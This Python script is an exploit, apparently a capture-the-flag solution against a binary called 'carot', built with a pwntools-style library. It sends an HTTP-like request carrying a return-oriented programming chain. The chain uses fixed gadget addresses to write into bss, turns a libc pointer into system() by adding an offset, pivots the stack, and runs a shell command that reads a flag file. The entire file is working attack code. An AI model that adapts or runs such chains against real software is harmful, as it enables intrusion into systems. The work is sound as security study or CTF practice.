#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *

exe  = context.binary = ELF('./carot')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 11451)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def arb_write(addr, string):
	string=string+b"\x00"*(8-(len(string)%8))
	a=seperate(string, 4)
	j=0
	payload = b""
	for i in a:
		if i == b'\x00\x00\x00\x00':
			j=j+4
			continue # skip the unnecessary add instruction if ebx is 0  
		payload += _3d_write(addr+j, i.ljust(8, b"\x00"))
		j=j+4
	return payload

def _3d_write(addr,value):
	tmp = flat([

		0x4019f2, # pop rbx, rbp, r[12 13 14 15]
		value,
		addr+0x3d,
		p(0)*4,
		_3d_gadget

	])
	return tmp

libc=SetupLibcELF()
io = start()

R = Rootkit(io)

mov_rax_rbp = 0x4014bd #    mov rax,QWORD PTR [rbp-0x8]; add rsp,0x10; ret
_3d_gadget  = 0x4011c8 #    add [rbp-0x3d], ebx; nop [rax+rax]; ret; 
mov_rbp_rax = 0x401902 #    mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret;

header = b"GET " + b"\x00"*524
bss=0x404040
system = bss+0xe80

rop=flat([

	header,
	
	# put a libc address at bss
	exe.sym['__libc_start_main']+8, # rbp
	mov_rax_rbp, # make rax point to __libc_start_main
	p(0)*3, # junk
	pop("rbp", system+8),
	mov_rbp_rax, # write rax to bss address (system variable points to that address in bss)
	b"\x00"*0x250, p(0xdeadbeef), # junk

	# write /bin/sh to bss
	arb_write(bss+0x10, b"/bin/cat /flag\x00"),

	# change __libc_start_main to system ; system = __libc_start_main + 0x2e450
	_3d_write(system, p(0x2e450)),

	# write pop rdi -> bss gadget before system address in bss
	arb_write(system-16, gadget("pop rdi; ret") + p(bss+0x10)),

	# call system("/bin/cat /flag\x00")
	0x000000004019f5, # pop rsp; r[13, 14, 15]; ret
	system-24-16, # stack pivot to pop rdi that we crafted above system address in bss 

])
sl(rop)
assert len(rop) < 4096
io.interactive()